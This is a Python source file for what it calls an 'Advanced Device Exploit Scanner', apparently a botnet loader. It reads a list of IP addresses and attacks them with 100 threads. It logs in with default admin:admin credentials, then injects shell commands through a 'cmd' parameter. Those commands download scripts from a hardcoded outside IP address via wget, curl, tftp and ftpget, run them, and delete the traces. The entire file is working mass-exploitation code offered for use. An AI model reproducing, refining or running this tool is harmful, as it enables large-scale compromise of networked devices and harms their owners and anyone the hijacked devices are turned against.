#!/usr/bin/env python3
"""
Advanced Device Exploit Scanner
Improved version with proper error handling, logging, rate limiting, and security.
"""

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from urllib3.exceptions import InsecureRequestWarning
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import time
import logging
import json
import sys
import signal
from typing import Optional, List, Dict, Tuple
from dataclasses import dataclass, asdict
from datetime import datetime
from pathlib import Path
import base64

# Suppress SSL warnings
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


# ============================================================================
# CONFIGURATION
# ============================================================================

@dataclass
class Config:
    """Configuration settings."""
    timeout: int = 8
    max_workers: int = 100
    max_retries: int = 2
    backoff_factor: float = 0.3
    rate_limit_per_second: float = 50.0
    user_agent: str = (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/120.0.6099.199 Safari/537.36"
    )
    input_file: str = "ips.txt"
    log_file: str = "scanner.log"
    results_file: str = "found_devices.json"
    auth_username: str = "admin"
    auth_password: str = "admin"
    payload_server: str = "72.62.37.166"
    payload_script: str = "1.sh"


config = Config()


# ============================================================================
# LOGGING
# ============================================================================

class ColorFormatter(logging.Formatter):
    """Console formatter with colors."""
    
    COLORS = {
        'DEBUG': '\033[36m',
        'INFO': '\033[32m',
        'WARNING': '\033[33m',
        'ERROR': '\033[31m',
        'CRITICAL': '\033[41m',
    }
    RESET = '\033[0m'
    
    def format(self, record):
        if sys.stdout.isatty():
            color = self.COLORS.get(record.levelname, self.RESET)
            record.levelname = f"{color}{record.levelname}{self.RESET}"
        return super().format(record)


def setup_logging() -> logging.Logger:
    """Configure logging."""
    logger = logging.getLogger("DeviceScanner")
    logger.setLevel(logging.DEBUG)
    
    # File handler
    file_handler = logging.FileHandler(config.log_file)
    file_handler.setLevel(logging.DEBUG)
    file_formatter = logging.Formatter(
        '%(asctime)s | %(levelname)-8s | %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    )
    file_handler.setFormatter(file_formatter)
    
    # Console handler
    console_handler = logging.StreamHandler(sys.stdout)
    console_handler.setLevel(logging.INFO)
    console_formatter = ColorFormatter('%(levelname)s | %(message)s')
    console_handler.setFormatter(console_formatter)
    
    logger.addHandler(file_handler)
    logger.addHandler(console_handler)
    
    return logger


logger = setup_logging()


# ============================================================================
# RATE LIMITING
# ============================================================================

class RateLimiter:
    """Token bucket rate limiter."""
    
    def __init__(self, rate: float):
        self.rate = rate
        self.tokens = rate
        self.last_update = time.time()
        self.lock = threading.Lock()
    
    def wait(self) -> None:
        """Wait if necessary to maintain rate limit."""
        with self.lock:
            now = time.time()
            elapsed = now - self.last_update
            self.tokens = min(self.rate, self.tokens + elapsed * self.rate)
            self.last_update = now
            
            if self.tokens < 1:
                sleep_time = (1 - self.tokens) / self.rate
                time.sleep(sleep_time)
                self.tokens = 0
            else:
                self.tokens -= 1


rate_limiter = RateLimiter(config.rate_limit_per_second)


# ============================================================================
# HTTP CLIENT
# ============================================================================

class HTTPClient:
    """Robust HTTP client with connection pooling and retries."""
    
    def __init__(self):
        self.session = requests.Session()
        
        retry_strategy = Retry(
            total=config.max_retries,
            backoff_factor=config.backoff_factor,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["GET", "POST"]
        )
        
        adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=50, pool_maxsize=50)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
    
    def close(self) -> None:
        """Close session."""
        self.session.close()
    
    def get(self, url: str, **kwargs) -> Optional[requests.Response]:
        """GET request with error handling."""
        try:
            rate_limiter.wait()
            return self.session.get(url, timeout=config.timeout, verify=False, **kwargs)
        except requests.exceptions.RequestException as e:
            logger.debug(f"GET failed {url}: {type(e).__name__}")
            return None


# ============================================================================
# DATA MODELS
# ============================================================================

@dataclass
class DeviceResult:
    """Result of scanning a device."""
    ip_port: str
    found: bool
    session_id: Optional[str] = None
    exploited: bool = False
    timestamp: str = ""
    error: Optional[str] = None
    response_time: float = 0.0


# ============================================================================
# EXPLOITATION LOGIC
# ============================================================================

class DeviceExploit:
    """Handle device exploitation workflow."""
    
    def __init__(self):
        self.http_client = HTTPClient()
        self.results: List[DeviceResult] = []
        self.results_lock = threading.Lock()
        self.found_count = 0
        self.found_lock = threading.Lock()
    
    def get_base_url(self, ip_port: str) -> str:
        """Normalize IP:port to URL."""
        if ip_port.startswith(('http://', 'https://')):
            return ip_port.rstrip('/')
        return f"http://{ip_port}"
    
    def get_auth_header(self) -> str:
        """Generate Basic Auth header."""
        credentials = f"{config.auth_username}:{config.auth_password}"
        encoded = base64.b64encode(credentials.encode()).decode()
        return f"Basic {encoded}"
    
    def step1_get_session(self, ip_port: str) -> Tuple[bool, Optional[str], float]:
        """
        Step 1: Send initial request to get SESSIONID.
        Returns (success, session_id, response_time)
        """
        base_url = self.get_base_url(ip_port)
        headers = {'User-Agent': config.user_agent, 'Connection': 'close'}
        
        try:
            start = time.time()
            response = self.http_client.get(base_url, headers=headers)
            elapsed = time.time() - start
            
            if not response:
                return False, None, elapsed
            
            # Check for Set-Cookie header
            if 'Set-Cookie' not in response.headers:
                logger.debug(f"No Set-Cookie in {ip_port}")
                return False, None, elapsed
            
            # Extract SESSIONID
            cookies = response.headers['Set-Cookie']
            try:
                session_id = cookies.split(';')[0].split('=')[1]
                logger.debug(f"Got SESSIONID for {ip_port}: {session_id}")
                return True, session_id, elapsed
            except (IndexError, ValueError):
                logger.debug(f"Failed to parse SESSIONID from {ip_port}")
                return False, None, elapsed
        
        except Exception as e:
            logger.debug(f"Step 1 error {ip_port}: {type(e).__name__}")
            return False, None, 0.0
    
    def step2_authenticate(self, ip_port: str, session_id: str) -> Tuple[bool, float]:
        """
        Step 2: Send authenticated request after login.
        Returns (success, response_time)
        """
        base_url = self.get_base_url(ip_port)
        headers = {
            'Host': ip_port.split('//')[-1],  # Extract host from URL
            'Cookie': f'SESSIONID={session_id}',
            'Authorization': self.get_auth_header(),
            'User-Agent': config.user_agent,
            'Connection': 'close'
        }
        
        try:
            start = time.time()
            response = self.http_client.get(base_url, headers=headers)
            elapsed = time.time() - start
            
            if response and response.status_code in [200, 401]:
                logger.debug(f"Auth check passed for {ip_port}")
                return True, elapsed
            
            return False, elapsed
        
        except Exception as e:
            logger.debug(f"Step 2 error {ip_port}: {type(e).__name__}")
            return False, 0.0
    
    def step3_inject_payload(self, ip_port: str, session_id: str) -> Tuple[bool, float]:
        """
        Step 3: Inject malicious payload.
        Returns (success, response_time)
        
        IMPORTANT: This is a PAYLOAD INJECTION endpoint.
        The payload gets executed on the target device.
        """
        base_url = self.get_base_url(ip_port)
        
        # Build payload - proper URL encoding
        payload_commands = [
            "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /",
            f"wget http://{config.payload_server}/{config.payload_script}",
            f"curl -O http://{config.payload_server}/{config.payload_script}",
            "chmod 777 1.sh",
            "sh 1.sh",
            f"tftp {config.payload_server} -c get 1.sh",
            "chmod 777 1.sh",
            "sh 1.sh",
            f"tftp -r 3.sh -g {config.payload_server}",
            "chmod 777 3.sh",
            "sh 3.sh",
            f"ftpget -v -u anonymous -p anonymous -P 21 {config.payload_server} 2.sh 2.sh",
            "sh 2.sh",
            "rm -rf 1.sh 3.sh 2.sh"
        ]
        
        # Construct full payload URL
        payload_string = "; ".join(payload_commands)
        exploit_url = f"{base_url}?cmd={payload_string}"
        
        headers = {
            'Host': ip_port.split('//')[-1],
            'Cookie': f'SESSIONID={session_id}',
            'Authorization': self.get_auth_header(),
            'User-Agent': config.user_agent,
            'Connection': 'close'
        }
        
        try:
            start = time.time()
            response = self.http_client.get(exploit_url, headers=headers)
            elapsed = time.time() - start
            
            if response and response.status_code == 200:
                logger.info(f"[+] PAYLOAD INJECTED: {ip_port}")
                return True, elapsed
            
            return False, elapsed
        
        except Exception as e:
            logger.debug(f"Step 3 error {ip_port}: {type(e).__name__}")
            return False, 0.0
    
    def exploit_device(self, ip_port: str) -> DeviceResult:
        """
        Full exploitation workflow.
        """
        result = DeviceResult(
            ip_port=ip_port,
            found=False,
            timestamp=datetime.now().isoformat()
        )
        
        try:
            # Step 1: Get session ID
            success, session_id, time1 = self.step1_get_session(ip_port)
            result.response_time += time1
            
            if not success:
                result.error = "Failed to get SESSIONID"
                return result
            
            result.session_id = session_id
            result.found = True
            
            # Step 2: Authenticate
            success, time2 = self.step2_authenticate(ip_port, session_id)
            result.response_time += time2
            
            if not success:
                result.error = "Authentication failed"
                logger.warning(f"[!] Device found but auth failed: {ip_port}")
                return result
            
            # Step 3: Inject payload
            success, time3 = self.step3_inject_payload(ip_port, session_id)
            result.response_time += time3
            
            if success:
                result.exploited = True
                logger.info(f"[★] EXPLOITED: {ip_port}")
            
        except Exception as e:
            result.error = f"Unexpected: {str(e)}"
            logger.error(f"Error exploiting {ip_port}: {e}", exc_info=True)
        
        # Store result
        with self.results_lock:
            self.results.append(result)
        
        # Track found devices
        if result.found:
            with self.found_lock:
                self.found_count += 1
        
        return result
    
    def close(self) -> None:
        """Cleanup."""
        self.http_client.close()


# ============================================================================
# UTILITIES
# ============================================================================

def load_ips(filepath: str) -> List[str]:
    """Load IP list from file."""
    try:
        with open(filepath, 'r') as f:
            ips = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        logger.info(f"Loaded {len(ips)} IPs from {filepath}")
        return ips
    except FileNotFoundError:
        logger.error(f"File not found: {filepath}")
        sys.exit(1)


def save_results(results: List[DeviceResult], filepath: str) -> None:
    """Save results to JSON."""
    found = [r for r in results if r.found]
    exploited = [r for r in results if r.exploited]
    
    data = {
        'timestamp': datetime.now().isoformat(),
        'total_scanned': len(results),
        'devices_found': len(found),
        'devices_exploited': len(exploited),
        'found_devices': [asdict(r) for r in found]
    }
    
    try:
        with open(filepath, 'w') as f:
            json.dump(data, f, indent=2)
        logger.info(f"Results saved to {filepath}")
    except IOError as e:
        logger.error(f"Failed to save results: {e}")


def signal_handler(sig, frame):
    """Handle Ctrl+C."""
    logger.warning("Scan interrupted")
    sys.exit(0)


# ============================================================================
# MAIN
# ============================================================================

def main() -> None:
    """Main entry point."""
    signal.signal(signal.SIGINT, signal_handler)
    
    logger.info("=" * 70)
    logger.info("Device Exploit Scanner Starting")
    logger.info("=" * 70)
    
    ips = load_ips(config.input_file)
    if not ips:
        logger.error("No IPs to scan")
        return
    
    exploit = DeviceExploit()
    start_time = time.time()
    
    try:
        logger.info(f"Starting scan with {config.max_workers} workers")
        
        with ThreadPoolExecutor(max_workers=config.max_workers) as executor:
            futures = {executor.submit(exploit.exploit_device, ip): ip for ip in ips}
            
            completed = 0
            for future in as_completed(futures):
                result = future.result()
                completed += 1
                
                if completed % 50 == 0:
                    found = exploit.found_count
                    pct = (completed / len(ips)) * 100
                    logger.info(f"Progress: {completed}/{len(ips)} ({pct:.1f}%) | Found: {found}")
        
        elapsed = time.time() - start_time
        found = len([r for r in exploit.results if r.found])
        exploited = len([r for r in exploit.results if r.exploited])
        
        logger.info("=" * 70)
        logger.info(f"Total scanned: {len(ips)}")
        logger.info(f"Devices found: {found}")
        logger.info(f"Devices exploited: {exploited}")
        logger.info(f"Time elapsed: {elapsed:.2f}s")
        logger.info(f"Rate: {len(ips)/elapsed:.2f} targets/sec")
        logger.info("=" * 70)
        
        save_results(exploit.results, config.results_file)
        
        # Print found devices
        found_devices = [r for r in exploit.results if r.found]
        if found_devices:
            logger.info(f"\nDevices found ({len(found_devices)}):")
            for device in found_devices:
                status = "✓ EXPLOITED" if device.exploited else "✗ FOUND"
                logger.info(f"  {status} | {device.ip_port} | SID: {device.session_id}")
    
    except Exception as e:
        logger.error(f"Fatal error: {e}", exc_info=True)
    finally:
        exploit.close()


if __name__ == "__main__":
    main()